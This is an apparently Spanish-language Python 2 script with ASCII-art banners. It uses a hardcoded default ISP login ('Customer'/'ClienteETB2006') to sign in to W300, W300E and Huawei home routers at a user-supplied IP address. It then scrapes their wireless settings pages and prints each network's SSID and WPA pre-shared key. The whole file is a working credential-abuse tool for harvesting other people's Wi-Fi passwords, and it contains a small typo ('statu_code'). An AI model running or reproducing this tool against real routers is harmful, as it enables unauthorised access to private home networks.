import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

device = raw_input(""" 
            
            
88      dP"Yb   dP""b8 88 88b 88     88""Yb  dP"Yb  88   88 888888 888888 88""Yb .dP"Y8     888888 888888 88""Yb 
88     dP   Yb dP   `" 88 88Yb88     88__dP dP   Yb 88   88   88   88__   88__dP `Ybo."     88__     88   88__dP 
88  .o Yb   dP Yb  "88 88 88 Y88     88"Yb  Yb   dP Y8   8P   88   88""   88"Yb  o.`Y8b     88""     88   88""Yb 
88ood8  YbodP   YboodP 88 88  Y8     88  Yb  YbodP  `YbodP'   88   888888 88  Yb 8bodP'     888888   88   88oodP 



[+] 1 w300
[+] 2 w300E
[+] 3 huawei


Option

        ***""")
device=str(device)
        
if device=="1": #w300
    ip = raw_input("Ingresa la IP: ")
    try:
        r = requests.get("http://"+ip+'/basic/home_wlan.htm', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=1)
        parser = r.content
        bs2=BeautifulSoup(parser, "html.parser")
        print str(r.statu_code)
        print bs2
        for name in bs2.find_all("input", {"name":"ESSID"}):
            print str(name["value"])
            for key in bs2.find_all("input", {"name":"PreSharedKey"}): 
                                    
                print str(ip)+".....w300......."+str(name["value"])+"....."+str(key["value"])
                
    except:
        print "Ocurrio un error.............................."

elif device=="2": #w300e
    ip = raw_input("Ingresa la IP: ")
    try:
        r = requests.get('http://'+ip+'/basic/wlan_simple.htm', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=1)
        rx = requests.get('http://'+ip+'/basic/home_wlan.htm', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=1)
        parserx = rx.content
        parser = r.content
        bsx = BeautifulSoup(parserx, "html.parser")
        bs = BeautifulSoup(parser, "html.parser")
        
        #/basic/home_wlan.htm
        
        print str(r.status_code)
                            

       
        
        parser2 = rx.content
        bs3=BeautifulSoup(parser2, "html.parser")
        for name in bsx.find_all("input", {"name":"ESSID"}):
            for key in bsx.find_all("input", {"name":"PreSharedKey"}):
                print str(ip)+".....w300ex......."+str(name["value"])+"....."+str(key["value"])
                
        for name in bs.find_all("input", {"name":"BeetelESSID"}):
            for key in bs.find_all("input", {"name":"BeetelPreSharedKey"}):
                print str(ip)+".....w300e......."+str(name["value"])+"....."+str(key["value"])
        
    except:
        print "Ocurrio un error.............................."

elif device=="3": #huawei
    ip = raw_input("Ingresa la IP: ")
    try:
        r = requests.get('http://'+ip+'/home_wlan.html', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=1)
        mac = requests.get('http://'+ip+'/rpSysStatus.html', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=1)
        #home_wlan.html
        parser = r.content
        parser1 = mac.content
        print str(r.status_code)
        
        bs1=BeautifulSoup(parser, "html.parser")
        #print bs1
        bs = BeautifulSoup(parser1, "html.parser")
        for ssid in bs1.find_all("input", {"name":"ESSID"}):
            print str(ssid["value"])
            for pss in bs1.find_all("input", {"name":"PreSharedKey"}):
                v = str(pss["value"])
                print len(v)
                print str(ip)+'....'+".....Huawei......."+str(ssid["value"])+"....."+str(pss["value"])
    except:
        print "Ocurrio un error.............................."
    
else:
    print """
            
                            d8,                        d8,                              d8b   d8,      d8b           
                           `8P                        `8P                               88P  `8P       88P           
                                                                                      d88            d88            
 d8888b ?88,.d88b, d8888b  88b d8888b   88bd88b       88b  88bd88b ?88   d8P d888b8b  888    88b d888888   d888b8b  
d8P' ?88`?88'  ?88d8P' `P  88Pd8P' ?88  88P' ?8b      88P  88P' ?8bd88  d8P'd8P' ?88  ?88    88Pd8P' ?88  d8P' ?88  
88b  d88  88b  d8P88b     d88 88b  d88 d88   88P     d88  d88   88P?8b ,88' 88b  ,88b  88b  d88 88b  ,88b 88b  ,88b 
`?8888P'  888888P'`?888P'd88' `?8888P'd88'   88b    d88' d88'   88b`?888P'  `?88P'`88b  88bd88' `?88P'`88b`?88P'`88b
          88P'                                                                                                      
         d88                                                                                                        
         ?8P     """                                                                                                   
    
    
    

